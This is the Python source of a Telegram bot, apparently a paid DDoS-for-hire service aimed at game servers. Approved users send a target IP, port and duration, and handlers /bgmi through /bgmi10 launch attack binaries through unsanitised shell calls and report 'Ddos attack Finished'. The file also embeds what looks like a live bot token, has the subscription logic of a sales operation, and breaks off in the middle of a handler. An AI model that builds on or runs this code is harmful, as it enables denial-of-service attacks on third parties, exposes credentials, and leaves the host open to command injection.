import telebot
import subprocess
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('7492939218:AAF1K2CLWNUyDyfhYKs3N2IGqkcFGJJKV4Q')
# Admin user IDs
admin_id = ["5512007480"]

blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]  # Blocked ports list

# File to store allowed user IDs
USER_FILE = "users.txt"
# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "𝗧𝗵𝗲𝗿𝗲 𝗮𝗿𝗲 𝗡𝗼 𝗟𝗼𝗴𝘀 ."
            else:
                file.truncate(0)
                response = "𝗔𝗹𝗹 𝗟𝗼𝗴𝘀 𝗗𝗲𝗹𝗲𝘁𝗲𝗱 ✅"
    except FileNotFoundError:
        response = "𝗛𝗲𝗿𝗲 𝗡𝗼 𝗔𝗡𝘆 𝗟𝗼𝗴𝘀."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

# Dictionary to store the approval expiry date for each user
user_approval_expiry = {}

# Function to calculate remaining approval time
def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

# Function to add or update user approval expiry date
def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  # Approximation of a month
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

# Command handler for adding a user with approval time
@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  # Extract the numeric part of the duration
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  # Extract the time unit (e.g., 'hour', 'day', 'week', 'month')
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format. Please provide a positive integer followed by 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} 👍."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID and the duration (e.g., 1hour, 2days, 3weeks, 4months) to add 😘."
    else:
        response = "You have not purchased yet purchase now from:- @Fridayxd."

    bot.reply_to(message, response)

# Command handler for retrieving user info
@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {user_role}\n📅 Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n⏳ Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "You have not purchased yet purchase now from:- @Fridayxd 🙇."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "You have not purchased yet purchase now from :- @Fridayxd ❄."
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully ✅"
        except FileNotFoundError:
            response = "users are already cleared ❌."
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @Fridayxd 🙇."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @Fridayxd ❄."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "ꜰʀᴇᴇ ᴋᴇ ᴅʜᴀʀᴍ ꜱʜᴀʟᴀ ʜᴀɪ ᴋʏᴀ ᴊᴏ ᴍᴜ ᴜᴛᴛʜᴀ ᴋᴀɪ ᴋʜɪ ʙʜɪ ɢᴜꜱ ʀʜᴀɪ ʜᴏ ʙᴜʏ ᴋʀᴏ ꜰʀᴇᴇ ᴍᴀɪ ᴋᴜᴄʜ ɴʜɪ ᴍɪʟᴛᴀ ʙᴜʏ:- @Fridayxd ❄."
        bot.reply_to(message, response)


# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    if port in blocked_ports:
            bot.send_message(message.chat.id, f"*𝗣𝗼𝗿𝘁 {port} 𝗶𝘀 𝗔 𝗕𝗹𝗼𝗰𝗸𝗲𝗱 𝗣𝗼𝗿𝘁 𝗣𝗹𝗲𝗮𝘀𝗲 𝗘𝗻𝘁𝗲𝗿 𝗡𝗲𝘄 𝗣𝗼𝗿𝘁 𝗡𝗼𝘁 𝗪𝗼𝗿𝗸𝗶𝗻𝗴 𝗣𝗼𝗿𝘁 𝗜𝘀 8700, 20000, 443, 17500, 9031, 20002, 20001*", parse_mode='Markdown')
            return
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝘁𝗮𝗿𝘁𝗲𝗱 ♥︎‿♥︎\n\n𝗧𝗮𝗿𝗴𝗲𝘁 𝗶𝗽: {target}\n𝗧𝗮𝗿𝗴𝗲𝘁 𝗣𝗼𝗿𝘁: {port}\n𝗧𝗶𝗺𝗶𝗻𝗴: {time} 𝘀𝗲𝗰"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "𝗬𝗼𝘂 𝗔𝗿𝗲 𝗜𝗻 𝗖𝗼𝗼𝗹 𝗗𝗼𝘄𝗻 𝗠𝗼𝗱𝗲. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 5 𝗺𝗶𝗻 𝗧𝗵𝗲𝗻 𝗦𝗲𝗻𝗱 𝗬𝗼𝘂𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 600:
                response = "Error: Time interval must be less than 600."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 110"
                process = subprocess.run(full_command, shell=True)
                response = f"𝗗𝗱𝗼𝘀 𝗮𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱. 𝗜𝗽: {target} \n𝗣𝗼𝗿𝘁: {port} \n𝗧𝗶𝗺𝗲: {time}"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "✅ Usage :- Your_Command <target> <port> <time>"  # Updated command syntax
    else:
        response = " 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗡𝗼𝘁 𝗶𝗻 𝗔𝗽𝗽𝗿𝗼𝘃𝗲 𝗨𝘀𝗲𝗿𝘀 ."

    bot.reply_to(message, response)


# Handler for /bgmi command
@bot.message_handler(commands=['bgmi2'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "𝗬𝗼𝘂 𝗔𝗿𝗲 𝗜𝗻 𝗖𝗼𝗼𝗹 𝗗𝗼𝘄𝗻 𝗠𝗼𝗱𝗲. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 5 𝗺𝗶𝗻 𝗧𝗵𝗲𝗻 𝗦𝗲𝗻𝗱 𝗬𝗼𝘂𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 600:
                response = "Error: Time interval must be less than 600."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi2 {target} {port} {time} 110"
                process = subprocess.run(full_command, shell=True)
                response = f"𝗗𝗱𝗼𝘀 𝗮𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱. 𝗜𝗽: {target} \n𝗣𝗼𝗿𝘁: {port} \n𝗧𝗶𝗺𝗲: {time}"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "✅ Usage :- Your_Command <target> <port> <time>"  # Updated command syntax
    else:
        response = " 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗡𝗼𝘁 𝗶𝗻 𝗔𝗽𝗽𝗿𝗼𝘃𝗲 𝗨𝘀𝗲𝗿𝘀 ."

    bot.reply_to(message, response)


# Handler for /bgmi command
@bot.message_handler(commands=['bgmi3'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "𝗬𝗼𝘂 𝗔𝗿𝗲 𝗜𝗻 𝗖𝗼𝗼𝗹 𝗗𝗼𝘄𝗻 𝗠𝗼𝗱𝗲. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 5 𝗺𝗶𝗻 𝗧𝗵𝗲𝗻 𝗦𝗲𝗻𝗱 𝗬𝗼𝘂𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 600:
                response = "Error: Time interval must be less than 600."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi3 {target} {port} {time} 110"
                process = subprocess.run(full_command, shell=True)
                response = f"𝗗𝗱𝗼𝘀 𝗮𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱. 𝗜𝗽: {target} \n𝗣𝗼𝗿𝘁: {port} \n𝗧𝗶𝗺𝗲: {time}"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "✅ Usage :- Your_Command <target> <port> <time>"  # Updated command syntax
    else:
        response = " 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗡𝗼𝘁 𝗶𝗻 𝗔𝗽𝗽𝗿𝗼𝘃𝗲 𝗨𝘀𝗲𝗿𝘀 ."

    bot.reply_to(message, response)



# Handler for /bgmi command
@bot.message_handler(commands=['bgmi4'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "𝗬𝗼𝘂 𝗔𝗿𝗲 𝗜𝗻 𝗖𝗼𝗼𝗹 𝗗𝗼𝘄𝗻 𝗠𝗼𝗱𝗲. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 5 𝗺𝗶𝗻 𝗧𝗵𝗲𝗻 𝗦𝗲𝗻𝗱 𝗬𝗼𝘂𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 600:
                response = "Error: Time interval must be less than 600."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi4 {target} {port} {time} 110"
                process = subprocess.run(full_command, shell=True)
                response = f"𝗗𝗱𝗼𝘀 𝗮𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱. 𝗜𝗽: {target} \n𝗣𝗼𝗿𝘁: {port} \n𝗧𝗶𝗺𝗲: {time}"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "✅ Usage :- Your_Command <target> <port> <time>"  # Updated command syntax
    else:
        response = " 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗡𝗼𝘁 𝗶𝗻 𝗔𝗽𝗽𝗿𝗼𝘃𝗲 𝗨𝘀𝗲𝗿𝘀 ."

    bot.reply_to(message, response)


# Handler for /bgmi command
@bot.message_handler(commands=['bgmi5'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "𝗬𝗼𝘂 𝗔𝗿𝗲 𝗜𝗻 𝗖𝗼𝗼𝗹 𝗗𝗼𝘄𝗻 𝗠𝗼𝗱𝗲. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 5 𝗺𝗶𝗻 𝗧𝗵𝗲𝗻 𝗦𝗲𝗻𝗱 𝗬𝗼𝘂𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 600:
                response = "Error: Time interval must be less than 600."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi5 {target} {port} {time} 110"
                process = subprocess.run(full_command, shell=True)
                response = f"𝗗𝗱𝗼𝘀 𝗮𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱. 𝗜𝗽: {target} \n𝗣𝗼𝗿𝘁: {port} \n𝗧𝗶𝗺𝗲: {time}"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "✅ Usage :- Your_Command <target> <port> <time>"  # Updated command syntax
    else:
        response = " 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗡𝗼𝘁 𝗶𝗻 𝗔𝗽𝗽𝗿𝗼𝘃𝗲 𝗨𝘀𝗲𝗿𝘀 ."

    bot.reply_to(message, response)

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi6'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "𝗬𝗼𝘂 𝗔𝗿𝗲 𝗜𝗻 𝗖𝗼𝗼𝗹 𝗗𝗼𝘄𝗻 𝗠𝗼𝗱𝗲. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 5 𝗺𝗶𝗻 𝗧𝗵𝗲𝗻 𝗦𝗲𝗻𝗱 𝗬𝗼𝘂𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 600:
                response = "Error: Time interval must be less than 600."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi6 {target} {port} {time} 110"
                process = subprocess.run(full_command, shell=True)
                response = f"𝗗𝗱𝗼𝘀 𝗮𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱. 𝗜𝗽: {target} \n𝗣𝗼𝗿𝘁: {port} \n𝗧𝗶𝗺𝗲: {time}"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "✅ Usage :- Your_Command <target> <port> <time>"  # Updated command syntax
    else:
        response = " 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗡𝗼𝘁 𝗶𝗻 𝗔𝗽𝗽𝗿𝗼𝘃𝗲 𝗨𝘀𝗲𝗿𝘀 ."

    bot.reply_to(message, response)

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi7'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "𝗬𝗼𝘂 𝗔𝗿𝗲 𝗜𝗻 𝗖𝗼𝗼𝗹 𝗗𝗼𝘄𝗻 𝗠𝗼𝗱𝗲. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 5 𝗺𝗶𝗻 𝗧𝗵𝗲𝗻 𝗦𝗲𝗻𝗱 𝗬𝗼𝘂𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 600:
                response = "Error: Time interval must be less than 600."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi7 {target} {port} {time} 110"
                process = subprocess.run(full_command, shell=True)
                response = f"𝗗𝗱𝗼𝘀 𝗮𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱. 𝗜𝗽: {target} \n𝗣𝗼𝗿𝘁: {port} \n𝗧𝗶𝗺𝗲: {time}"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "✅ Usage :- Your_Command <target> <port> <time>"  # Updated command syntax
    else:
        response = " 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗡𝗼𝘁 𝗶𝗻 𝗔𝗽𝗽𝗿𝗼𝘃𝗲 𝗨𝘀𝗲𝗿𝘀 ."

    bot.reply_to(message, response)

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi8'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "𝗬𝗼𝘂 𝗔𝗿𝗲 𝗜𝗻 𝗖𝗼𝗼𝗹 𝗗𝗼𝘄𝗻 𝗠𝗼𝗱𝗲. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 5 𝗺𝗶𝗻 𝗧𝗵𝗲𝗻 𝗦𝗲𝗻𝗱 𝗬𝗼𝘂𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 600:
                response = "Error: Time interval must be less than 600."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi8 {target} {port} {time} 110"
                process = subprocess.run(full_command, shell=True)
                response = f"𝗗𝗱𝗼𝘀 𝗮𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱. 𝗜𝗽: {target} \n𝗣𝗼𝗿𝘁: {port} \n𝗧𝗶𝗺𝗲: {time}"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "✅ Usage :- Your_Command <target> <port> <time>"  # Updated command syntax
    else:
        response = " 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗡𝗼𝘁 𝗶𝗻 𝗔𝗽𝗽𝗿𝗼𝘃𝗲 𝗨𝘀𝗲𝗿𝘀 ."

    bot.reply_to(message, response)

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi9'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "𝗬𝗼𝘂 𝗔𝗿𝗲 𝗜𝗻 𝗖𝗼𝗼𝗹 𝗗𝗼𝘄𝗻 𝗠𝗼𝗱𝗲. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗪𝗮𝗶𝘁 5 𝗺𝗶𝗻 𝗧𝗵𝗲𝗻 𝗦𝗲𝗻𝗱 𝗬𝗼𝘂𝗿 𝗖𝗼𝗺𝗺𝗮𝗻𝗱"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert port to integer
            time = int(command[3])  # Convert time to integer
            if time > 600:
                response = "Error: Time interval must be less than 600."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi9 {target} {port} {time} 110"
                process = subprocess.run(full_command, shell=True)
                response = f"𝗗𝗱𝗼𝘀 𝗮𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱. 𝗜𝗽: {target} \n𝗣𝗼𝗿𝘁: {port} \n𝗧𝗶𝗺𝗲: {time}"
                bot.reply_to(message, response)  # Notify the user that the attack is finished
        else:
            response = "✅ Usage :- Your_Command <target> <port> <time>"  # Updated command syntax
    else:
        response = " 𝗬𝗼𝘂 𝗔𝗿𝗲 𝗡𝗼𝘁 𝗶𝗻 𝗔𝗽𝗽𝗿𝗼𝘃𝗲 𝗨𝘀𝗲𝗿𝘀 ."

    bot.reply_to(message, response)

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi10'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
